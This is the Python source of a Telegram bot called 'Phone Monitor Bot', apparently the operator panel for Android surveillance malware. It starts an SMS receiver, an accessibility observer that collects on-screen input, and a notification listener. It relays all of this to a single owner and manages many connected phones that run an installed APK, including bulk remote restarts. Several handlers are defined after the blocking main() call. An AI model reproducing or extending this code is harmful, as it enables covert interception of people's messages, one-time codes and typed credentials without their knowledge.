import logging
import threading
import time
import sys
import requests
import telebot
from datetime import datetime

from bot.config import (
    BOT_TOKEN, OWNER_ID, WEBHOOK_URL, SECRET_TOKEN,
    WEBHOOK_PORT, validate_config
)
from bot.database.db_manager import db
from bot.services.sms_service import sms_service
from bot.services.queue_manager import queue_manager
from bot.services.sync_service import sync_service
from bot.services.reconnect_service import reconnect_service
from bot.services.device_watcher_service import device_watcher
from bot.utils.delivery_tracker import delivery_tracker
from bot.handlers import (
    register_sms_handlers,
    register_contact_handlers,
    register_viewer_handlers,
    register_notification_handlers
)
from bot.handlers.sms_handler import register_sms_forward_handlers
from bot.menus.main_menu import (
    main_menu, main_menu_text,
    settings_menu, settings_menu_text,
    queue_status_menu, connection_menu,
    back_to_main
)
from bot.android.SmsReceiver import sms_receiver
from bot.android.AccessibilityObserver import accessibility_observer
from bot.android.AlertListener import alert_listener
from bot.webhook import register_bot, start_webhook_server

# ─────────────────────────────────────────
# LOGGING SETUP
# ─────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# ─────────────────────────────────────────
# BOT INSTANCE
# ─────────────────────────────────────────
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)


# ─────────────────────────────────────────
# OWNER GUARD
# Only the owner can use this bot
# ─────────────────────────────────────────
def owner_only(func):
    def wrapper(message_or_call):
        user_id = None
        if hasattr(message_or_call, "from_user"):
            user_id = message_or_call.from_user.id
        elif hasattr(message_or_call, "message"):
            user_id = message_or_call.from_user.id
        if user_id != OWNER_ID:
            logger.warning(f"Unauthorized access attempt from: {user_id}")
            return
        return func(message_or_call)
    return wrapper


# ─────────────────────────────────────────
# /start COMMAND
# ─────────────────────────────────────────
@bot.message_handler(commands=["start"])
def handle_start(message):
    if message.from_user.id != OWNER_ID:
        return
    try:
        bot.send_message(
            chat_id=message.chat.id,
            text=(
                f"🏠 <b>Phone Monitor Bot</b>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"✅ Bot is online and running\n"
                f"🕐 Started: {datetime.now().strftime('%H:%M:%S')}\n\n"
                f"Select an option below:"
            ),
            reply_markup=main_menu(),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Start command error: {e}")


# ─────────────────────────────────────────
# MAIN MENU HANDLER
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "menu_main")
def handle_main_menu(call):
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=main_menu_text(),
            reply_markup=main_menu(),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Main menu error: {e}")


# ─────────────────────────────────────────
# SETTINGS MENU HANDLER
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "menu_settings")
def handle_settings_menu(call):
    try:
        offline_mode = db.get_setting("offline_mode", "true") == "true"
        auto_sync = sync_service._running

        markup = telebot.types.InlineKeyboardMarkup()
        markup.row(
            telebot.types.InlineKeyboardButton(
                f"📴 Offline Mode: {'ON' if offline_mode else 'OFF'}",
                callback_data="toggle_offline_mode"
            )
        )
        markup.row(
            telebot.types.InlineKeyboardButton(
                f"🔄 Auto Sync: {'ON' if auto_sync else 'OFF'}",
                callback_data="toggle_auto_sync"
            )
        )
        markup.row(
            telebot.types.InlineKeyboardButton("🗑 Clear All Queues", callback_data="action_clear_queues")
        )
        markup.row(
            telebot.types.InlineKeyboardButton("📊 Delivery Stats", callback_data="action_delivery_stats")
        )
        markup.row(
            telebot.types.InlineKeyboardButton("🔙 Back", callback_data="menu_main")
        )

        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=settings_menu_text(),
            reply_markup=markup,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Settings menu error: {e}")


# ─────────────────────────────────────────
# TOGGLE OFFLINE MODE
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "toggle_offline_mode")
def handle_toggle_offline_mode(call):
    try:
        current = db.get_setting("offline_mode", "true") == "true"
        new_value = "false" if current else "true"
        db.set_setting("offline_mode", new_value)
        status = "🟢 ON" if new_value == "true" else "🔴 OFF"
        bot.answer_callback_query(call.id, f"Offline Mode {status}")
        handle_settings_menu(call)
    except Exception as e:
        logger.error(f"Toggle offline mode error: {e}")


# ─────────────────────────────────────────
# TOGGLE AUTO SYNC
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "toggle_auto_sync")
def handle_toggle_auto_sync(call):
    try:
        if sync_service._running:
            sync_service.stop()
            queue_manager.stop_auto_sync()
            bot.answer_callback_query(call.id, "🔴 Auto Sync stopped")
        else:
            sync_service.start()
            queue_manager.start_auto_sync()
            bot.answer_callback_query(call.id, "🟢 Auto Sync started")
        handle_settings_menu(call)
    except Exception as e:
        logger.error(f"Toggle auto sync error: {e}")


# ─────────────────────────────────────────
# QUEUE STATUS MENU
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "menu_queue_status")
def handle_queue_status(call):
    try:
        stats = delivery_tracker.format_stats_message()
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=stats,
            reply_markup=queue_status_menu(),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Queue status error: {e}")


# ─────────────────────────────────────────
# CONNECTION STATUS MENU
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "menu_connection")
def handle_connection_menu(call):
    try:
        conn_status = reconnect_service.format_status_message()
        sync_status = sync_service.format_sync_status_message()
        combined = f"{conn_status}\n{sync_status}"
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=combined,
            reply_markup=connection_menu(),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Connection menu error: {e}")


# ─────────────────────────────────────────
# ACTION — SYNC NOW
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "action_sync_now")
def handle_sync_now(call):
    try:
        bot.answer_callback_query(call.id, "🔄 Syncing...")
        result = sync_service.sync_now()
        if result.get("success"):
            status = result.get("status", {})
            text = (
                f"✅ <b>Sync Complete</b>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"📱 SMS Queue: {status.get('sms_queue', 0)}\n"
                f"👁 Input Queue: {status.get('viewer_queue', 0)}\n"
                f"🔔 Alert Queue: {status.get('notification_queue', 0)}\n"
                f"🕐 Time: {datetime.now().strftime('%H:%M:%S')}\n"
            )
        else:
            reason = result.get("reason", "unknown")
            text = (
                f"⚠️ <b>Sync Failed</b>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"Reason: {reason}\n"
            )
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=back_to_main(),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Sync now error: {e}")


# ─────────────────────────────────────────
# ACTION — RECONNECT
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "action_reconnect")
def handle_reconnect(call):
    try:
        bot.answer_callback_query(call.id, "🔌 Reconnecting...")
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=(
                "🔌 <b>Reconnection initiated</b>\n"
                "━━━━━━━━━━━━━━━━\n"
                "Reconnect service is checking connection...\n"
                f"🕐 Time: {datetime.now().strftime('%H:%M:%S')}\n"
            ),
            reply_markup=back_to_main(),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Reconnect error: {e}")


# ─────────────────────────────────────────
# ACTION — SYNC STATUS
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "action_sync_status")
def handle_sync_status(call):
    try:
        text = sync_service.format_sync_status_message()
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=back_to_main(),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Sync status error: {e}")


# ─────────────────────────────────────────
# ACTION — DELIVERY STATS
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "action_delivery_stats")
def handle_delivery_stats(call):
    try:
        stats = delivery_tracker.format_stats_message()
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=stats,
            reply_markup=back_to_main(),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Delivery stats error: {e}")


# ─────────────────────────────────────────
# ACTION — CLEAR ALL QUEUES
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "action_clear_queues")
def handle_clear_queues_confirm(call):
    try:
        markup = telebot.types.InlineKeyboardMarkup()
        markup.row(
            telebot.types.InlineKeyboardButton("✅ Yes, Clear All", callback_data="confirm_clear_queues"),
            telebot.types.InlineKeyboardButton("❌ Cancel", callback_data="menu_main")
        )
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=(
                "⚠️ <b>Clear All Queues?</b>\n"
                "━━━━━━━━━━━━━━━━\n"
                "This will delete all pending items from:\n"
                "📱 SMS Queue\n"
                "👁 Input Queue\n"
                "🔔 Alert Queue\n\n"
                "Are you sure?"
            ),
            reply_markup=markup,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Clear queues confirm error: {e}")


@bot.callback_query_handler(func=lambda c: c.data == "confirm_clear_queues")
def handle_confirm_clear_queues(call):
    try:
        queue_manager.clear_all()
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="✅ <b>All queues cleared successfully</b>",
            reply_markup=back_to_main(),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Confirm clear queues error: {e}")


# ─────────────────────────────────────────
# REGISTER WEBHOOK WITH TELEGRAM
# ─────────────────────────────────────────
def setup_webhook():
    try:
        webhook_url = f"{WEBHOOK_URL}/webhook"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook"
        payload = {
            "url": webhook_url,
            "allowed_updates": ["message", "callback_query"],
            "drop_pending_updates": True
        }
        if SECRET_TOKEN:
            payload["secret_token"] = SECRET_TOKEN

        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            result = response.json()
            if result.get("ok"):
                logger.info(f"Webhook set: {webhook_url}")
                return True
            else:
                logger.error(f"Webhook setup failed: {result}")
                return False
        else:
            logger.error(f"Webhook setup HTTP error: {response.status_code}")
            return False
    except Exception as e:
        logger.error(f"Setup webhook error: {e}")
        return False


# ─────────────────────────────────────────
# START ALL BACKGROUND SERVICES
# ─────────────────────────────────────────
def start_services():
    try:
        logger.info("Starting background services...")

        # ── Queue auto sync ──
        queue_manager.start_auto_sync()
        logger.info("Queue manager started")

        # ── Sync service ──
        sync_service.start()
        logger.info("Sync service started")

        # ── Reconnect monitor ──
        reconnect_service.start()
        logger.info("Reconnect service started")

        # ── Android receivers ──
        sms_receiver.start()
        logger.info("SMS receiver started")

        accessibility_observer.start()
        logger.info("Accessibility observer started")

        alert_listener.start()
        logger.info("Alert listener started")

        # ── Device watcher — inject registry from webhook ──
        from bot.webhook import _device_last_seen, _device_registry, _pending_commands
        device_watcher.set_device_registry(
            _device_last_seen, _device_registry, _pending_commands
        )
        device_watcher.start()
        logger.info("Device watcher started")

        logger.info("All background services started")
    except Exception as e:
        logger.error(f"Start services error: {e}")


# ─────────────────────────────────────────
# REGISTER ALL HANDLERS
# ─────────────────────────────────────────
def register_all_handlers():
    try:
        register_sms_handlers(bot)
        logger.info("SMS handlers registered")

        register_sms_forward_handlers(bot)
        logger.info("SMS forward handlers registered")

        from bot.handlers.sms_handler import register_sms_number_handler
        register_sms_number_handler(bot)
        logger.info("SMS number handler registered")

        from bot.handlers.forward_handler import register_forward_handlers
        register_forward_handlers(bot)
        logger.info("Forward handlers registered")

        register_contact_handlers(bot)
        logger.info("Contact handlers registered")

        register_viewer_handlers(bot)
        logger.info("Viewer handlers registered")

        register_notification_handlers(bot)
        logger.info("Notification handlers registered")

        logger.info("All handlers registered")
    except Exception as e:
        logger.error(f"Register handlers error: {e}")
        raise


# ─────────────────────────────────────────
# SEND STARTUP NOTIFICATION
# ─────────────────────────────────────────
def send_startup_notification():
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": OWNER_ID,
            "text": (
                f"✅ <b>Bot Started</b>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"📡 All services running\n"
                f"🔔 Monitoring active\n"
                f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                f"Send /start to open the menu."
            ),
            "parse_mode": "HTML"
        }
        requests.post(url, json=payload, timeout=10)
        logger.info("Startup notification sent")
    except Exception as e:
        logger.error(f"Startup notification error: {e}")


# ─────────────────────────────────────────
# MAIN ENTRY POINT
# Uses polling mode — no HTTPS needed
# Works directly on Windows RDP
# ─────────────────────────────────────────
def main():
    try:
        logger.info("=== Bot starting ===")

        # ── Validate config ──
        validate_config()
        logger.info("Config validated")

        # ── Register all handlers ──
        register_all_handlers()

        # ── Start background services ──
        start_services()

        # ── Remove any existing webhook ──
        try:
            import requests as req
            req.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
                timeout=10
            )
            logger.info("Webhook cleared — using polling mode")
        except Exception:
            pass

        # ── Notify owner ──
        send_startup_notification()

        logger.info("=== Bot ready — polling for updates ===")

        # ── Start polling (blocking) — no HTTPS needed ──
        bot.infinity_polling(
            timeout=10,
            long_polling_timeout=5,
            logger_level=logging.INFO
        )

    except Exception as e:
        logger.error(f"Main startup error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()


# ─────────────────────────────────────────
# CONNECTED DEVICES MENU
# ─────────────────────────────────────────
def _build_devices_text_and_markup():
    from bot.webhook import get_all_devices
    from bot.menus.main_menu import connected_devices_menu
    devices = get_all_devices()
    auto_on = device_watcher.is_auto_restart_enabled()
    online_count = sum(1 for d in devices if d["online"])
    offline_count = len(devices) - online_count
    if not devices:
        text = (
            f"📱 <b>Connected Devices</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"No devices connected yet.\n"
            f"Install APK on your phone to connect."
        )
        return text, connected_devices_menu([], auto_on)
    text = (
        f"📱 <b>Connected Devices</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"🟢 Online: {online_count}   🔴 Offline: {offline_count}\n"
        f"⚡ Auto Restart: {'ON' if auto_on else 'OFF'}\n\n"
    )
    for i, device in enumerate(devices, 1):
        if device["online"]:
            status = "🟢 Online"
        else:
            status = f"🔴 Offline — last seen {device['last_seen']}"
        text += f"{i}. <b>{device['model']}</b>\n   {status}\n\n"
    return text, connected_devices_menu(devices, auto_on)


@bot.callback_query_handler(func=lambda c: c.data == "menu_devices")
def handle_devices_menu(call):
    try:
        text, markup = _build_devices_text_and_markup()
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=markup,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Devices menu error: {e}")


# ─────────────────────────────────────────
# DEVICE INFO — TAP ON DEVICE NAME
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("device_info_"))
def handle_device_info(call):
    try:
        from bot.webhook import get_all_devices
        from bot.menus.main_menu import connected_devices_menu
        device_id = call.data.replace("device_info_", "")
        devices = get_all_devices()
        device = next((d for d in devices if d["device_id"] == device_id), None)
        if not device:
            bot.answer_callback_query(call.id, "Device not found")
            return
        status = "🟢 Online" if device["online"] else f"🔴 Offline"
        text = (
            f"📱 <b>{device['model']}</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"Status: {status}\n"
            f"Last seen: {device['last_seen']}\n"
            f"Android: {device.get('android_version', 'Unknown')}\n"
        )
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=connected_devices_menu(devices),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Device info error: {e}")


# ─────────────────────────────────────────
# DEVICE RESTART — TAP RESTART BUTTON
# Sends reconnect command to specific device
# Device polls /android/commands → gets command
# WakeService restarts DeviceSyncService
# Device sends online confirmation back
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("device_restart_"))
def handle_device_restart(call):
    try:
        from bot.webhook import send_reconnect_command, get_all_devices
        from bot.menus.main_menu import connected_devices_menu
        device_id = call.data.replace("device_restart_", "")
        devices = get_all_devices()
        device = next((d for d in devices if d["device_id"] == device_id), None)
        model = device["model"] if device else "Device"
        # Send reconnect command — device picks it up within 15 seconds
        send_reconnect_command(device_id)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=(
                f"🔄 <b>Restart Signal Sent</b>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"📱 Device: <b>{model}</b>\n"
                f"⏳ Waiting for device to reconnect...\n"
                f"🕐 Signal sent at: {__import__('datetime').datetime.now().strftime('%H:%M:%S')}\n\n"
                f"Device will reconnect within 15 seconds.\n"
                f"Go back to Devices to check status."
            ),
            reply_markup=connected_devices_menu(devices),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Device restart error: {e}")


# ─────────────────────────────────────────
# RESTART ALL OFFLINE DEVICES
# One tap — sends restart to all offline
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "device_restart_all_offline")
def handle_restart_all_offline(call):
    try:
        result = device_watcher.restart_all_offline()
        count = result.get("count", 0)
        devices = result.get("devices", [])
        if count == 0:
            bot.answer_callback_query(call.id, "✅ All devices already online")
            return
        device_list = "\n".join([f"• {m}" for m in devices[:10]])
        if len(devices) > 10:
            device_list += f"\n• ...and {len(devices) - 10} more"
        text, markup = _build_devices_text_and_markup()
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=(
                f"🔄 <b>Restart Signal Sent</b>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"📡 Signal sent to <b>{count}</b> offline devices\n\n"
                f"{device_list}\n\n"
                f"⏳ Devices reconnecting within 15 seconds.\n"
                f"🕐 {datetime.now().strftime('%H:%M:%S')}"
            ),
            reply_markup=markup,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Restart all offline error: {e}")


# ─────────────────────────────────────────
# TOGGLE AUTO DEVICE RESTART
# ─────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "toggle_auto_device_restart")
def handle_toggle_auto_device_restart(call):
    try:
        current = device_watcher.is_auto_restart_enabled()
        new_value = "false" if current else "true"
        db.set_setting("auto_device_restart_enabled", new_value)
        status = "🟢 ON" if new_value == "true" else "🔴 OFF"
        bot.answer_callback_query(call.id, f"⚡ Auto Restart {status}")
        text, markup = _build_devices_text_and_markup()
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=markup,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Toggle auto device restart error: {e}")
